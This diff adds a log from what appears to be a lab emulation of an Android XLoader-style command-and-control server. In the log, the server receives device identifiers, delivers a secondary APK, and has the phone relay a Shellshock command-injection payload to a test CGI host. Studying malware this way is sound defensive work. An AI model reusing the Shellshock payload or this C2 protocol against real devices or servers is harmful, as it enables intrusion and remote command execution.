@@ -1,0 +1,39 @@
+[c2] listening: {"host": "1.162.98.240", "port": 28833, "transport": "RFC6455 frames directly over TCP; no HTTP handshake"}
+[c2] client_connected: {"peer": ["172.22.0.1", 58991]}
+Esperando getPkgData durante un máximo de 300 segundos...
+[c2] rpc_received: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "method": "state", "id": 1, "params": ["Android", "lte", ",0,", 0, 0, false, false, false, 2, false]}}
+[c2] safe_default_response: {"method": "state", "params": ["Android", "lte", ",0,", 0, 0, false, false, false, 2, false]}
+[c2] rpc_sent: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "id": 1, "result": null}, "frame_length": 25}
+[c2] rpc_received: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "method": "state", "id": 2, "params": ["Android", "lte", ",0,", 100, 0, false, false, false, 2, false]}}
+[c2] safe_default_response: {"method": "state", "params": ["Android", "lte", ",0,", 100, 0, false, false, false, 2, false]}
+[c2] rpc_sent: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "id": 2, "result": null}, "frame_length": 25}
+[c2] rpc_received: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "method": "state", "id": 3, "params": ["Android", "lte", ",0,", 100, 0, false, false, false, 2, false]}}
+[c2] safe_default_response: {"method": "state", "params": ["Android", "lte", ",0,", 100, 0, false, false, false, 2, false]}
+[c2] rpc_sent: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "id": 3, "result": null}, "frame_length": 25}
+[c2] rpc_received: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "method": "state", "id": 4, "params": ["Android", "lte", ",0,", 100, 0, false, false, false, 2, false]}}
+[c2] safe_default_response: {"method": "state", "params": ["Android", "lte", ",0,", 100, 0, false, false, false, 2, false]}
+[c2] rpc_sent: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "id": 4, "result": null}, "frame_length": 25}
+[c2] rpc_received: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "method": "ondbm", "id": 5, "params": [2]}}
+[c2] safe_default_response: {"method": "ondbm", "params": [2]}
+[c2] rpc_sent: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "id": 5, "result": null}, "frame_length": 25}
+[c2] rpc_received: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "method": "hello", "id": 6, "params": ["2x8npwDHMZ2Fkn3rRtHXXg", 72, "5.1.1", "Android SDK built for x86:sdk_phone_x86-userdebug 5.1.1 LMY48X 4174727 test-keys", true, 0, true, "+15555215554", "358240051111110", "", 1499889783000, 1]}}
+[c2] rpc_sent: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "id": 6, "result": null}, "frame_length": 25}
+[c2] rpc_received: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "method": "state", "id": 7, "params": ["Android", "lte", ",0,", 100, 0, false, false, false, 2, false]}}
+[c2] safe_default_response: {"method": "state", "params": ["Android", "lte", ",0,", 100, 0, false, false, false, 2, false]}
+[c2] rpc_sent: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "id": 7, "result": null}, "frame_length": 25}
+[c2] rpc_received: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "method": "getSmsKW", "id": 8}}
+[c2] rpc_sent: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "id": 8, "result": []}, "frame_length": 25}
+[c2] rpc_received: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "method": "is_call_rec_enable", "id": 9}}
+[c2] rpc_sent: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "id": 9, "result": false}, "frame_length": 25}
+[c2] rpc_received: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "method": "is_show_fs_float_window", "id": 10}}
+[c2] rpc_sent: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "id": 10, "result": false}, "frame_length": 25}
+[c2] rpc_received: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "method": "getPkgMap", "id": 11, "params": [false]}}
+[c2] rpc_sent: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "id": 11, "result": [{"type": "bytes", "length": 25, "sha256": "dcd1ce4ddc9c6fd31e92a7c82d757dc1a595e63d66fb8a6fcc2a2764ac64659b"}]}, "frame_length": 52}
+[c2] rpc_received: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "method": "getPkgData", "id": 12, "params": ["lab.xloader.secondary"]}}
+[c2] rpc_sent: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "id": 12, "result": [{"type": "bytes", "length": 12755, "sha256": "4896291f416fbbce50775c258d3f72c7d5c0c48a770084e6cb0ec73878dfb7ee"}]}, "frame_length": 12783}
+[c2] secondary_apk_delivered: {"package": "lab.xloader.secondary", "length": 12755, "sha256": "4896291f416fbbce50775c258d3f72c7d5c0c48a770084e6cb0ec73878dfb7ee"}
+[c2] shellshock_rpc_start: {"params": ["http://vuln.lab/cgi-bin/status", "GET", {"User-Agent": ["() { :;}; echo; /usr/bin/id"]}, {"type": "bytes", "length": 0, "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}]}
+[c2] rpc_sent: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "method": "http", "id": 9001, "params": ["http://vuln.lab/cgi-bin/status", "GET", {"User-Agent": ["() { :;}; echo; /usr/bin/id"]}, {"type": "bytes", "length": 0, "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}]}, "frame_length": 117}
+[c2] rpc_received: {"peer": ["172.22.0.1", 58991], "rpc": {"jsonrpc": "2.0", "id": 9001, "result": [200, {"None": ["HTTP/1.1 200 OK"], "Connection": ["close"], "Content-Length": ["44"], "Content-Type": ["text/plain; charset=us-ascii"], "Date": ["Mon, 24 Aug 2026 10:27:22 GMT"], "Server": ["Apache/2.4.7 (Ubuntu)"], "X-Android-Received-Millis": ["1787567240911"], "X-Android-Response-Source": ["NETWORK 200"], "X-Android-Sent-Millis": ["1787567240906"]}, {"type": "bytes", "length": 44, "sha256": "c13976b17e68254dd68842679c80db0adacfa2497feee7244012adb3b3daa581"}]}}
+[c2] scenario_complete: {"techniques": ["T1481.001", "T1509", "T1407", "T1604", "T1428"], "http_response": {"jsonrpc": "2.0", "id": 9001, "result": [200, {"None": ["HTTP/1.1 200 OK"], "Connection": ["close"], "Content-Length": ["44"], "Content-Type": ["text/plain; charset=us-ascii"], "Date": ["Mon, 24 Aug 2026 10:27:22 GMT"], "Server": ["Apache/2.4.7 (Ubuntu)"], "X-Android-Received-Millis": ["1787567240911"], "X-Android-Response-Source": ["NETWORK 200"], "X-Android-Sent-Millis": ["1787567240906"]}, {"type": "bytes", "length": 44, "sha256": "c13976b17e68254dd68842679c80db0adacfa2497feee7244012adb3b3daa581"}]}}
+Escenario completado: la respuesta Shellshock emulada volvió correctamente por el C2.
